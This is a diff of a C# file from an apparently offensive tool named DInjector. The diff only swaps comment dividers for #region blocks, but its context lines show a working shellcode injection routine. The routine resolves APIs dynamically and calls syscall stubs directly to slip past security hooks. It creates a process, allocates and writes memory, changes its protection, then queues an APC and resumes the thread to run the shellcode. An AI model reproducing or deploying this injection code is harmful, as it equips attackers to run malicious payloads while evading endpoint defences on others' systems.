@@ -87,7 +87,7 @@ namespace DInjector
         {
             var shellcode = shellcodeBytes;
 
-            // -- CreateProcessA -------------------------------------------------
+            #region CreateProcessA
 
             IntPtr pointer = DI.DynamicInvoke.Generic.GetLibraryAddress("kernel32.dll", "CreateProcessA");
             CreateProcess dCreateProcess = (CreateProcess)Marshal.GetDelegateForFunctionPointer(pointer, typeof(CreateProcess));
@@ -116,7 +116,9 @@ namespace DInjector
                 Console.WriteLine("(Module) [-] CreateProcess");
             }
 
-            // -- NtAllocateVirtualMemory ----------------------------------------
+            #endregion
+
+            #region NtAllocateVirtualMemory
 
             IntPtr stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtAllocateVirtualMemory");
             NtAllocateVirtualMemory sysNtAllocateVirtualMemory = (NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtAllocateVirtualMemory));
@@ -143,7 +145,9 @@ namespace DInjector
                 Console.WriteLine($"(Module) [-] NtAllocateVirtualMemory: {ntstatus}");
             }
 
-            // -- NtWriteVirtualMemory -------------------------------------------
+            #endregion
+
+            #region NtWriteVirtualMemory
 
             stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtWriteVirtualMemory");
             NtWriteVirtualMemory sysNtWriteVirtualMemory = (NtWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtWriteVirtualMemory));
@@ -171,7 +175,9 @@ namespace DInjector
 
             Marshal.FreeHGlobal(buffer);
 
-            // -- NtProtectVirtualMemory -----------------------------------------
+            #endregion
+
+            #region NtProtectVirtualMemory
 
             stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtProtectVirtualMemory");
             NtProtectVirtualMemory sysNtProtectVirtualMemory = (NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtProtectVirtualMemory));
@@ -194,7 +200,9 @@ namespace DInjector
                 Console.WriteLine($"(Module) [-] NtProtectVirtualMemory: {ntstatus}");
             }
 
-            // -- NtOpenThread ---------------------------------------------------
+            #endregion
+
+            #region NtOpenThread
 
             stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtOpenThread");
             NtOpenThread sysNtOpenThread = (NtOpenThread)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtOpenThread));
@@ -218,7 +226,9 @@ namespace DInjector
                 Console.WriteLine($"(Module) [-] NtOpenThread: {ntstatus}");
             }
 
-            // -- NtQueueApcThread -----------------------------------------------
+            #endregion
+
+            #region NtQueueApcThread
 
             stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtQueueApcThread");
             NtQueueApcThread sysNtQueueApcThread = (NtQueueApcThread)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtQueueApcThread));
@@ -239,7 +249,9 @@ namespace DInjector
                 Console.WriteLine($"(Module) [-] NtQueueApcThread: {ntstatus}");
             }
 
-            // -- NtAlertResumeThread --------------------------------------------
+            #endregion
+
+            #region NtAlertResumeThread
 
             stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtAlertResumeThread");
             NtAlertResumeThread sysNtAlertResumeThread = (NtAlertResumeThread)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtAlertResumeThread));
@@ -258,6 +270,8 @@ namespace DInjector
             {
                 Console.WriteLine($"(Module) [-] NtAlertResumeThread: {ntstatus}");
             }
+
+            #endregion
         }
     }
 }
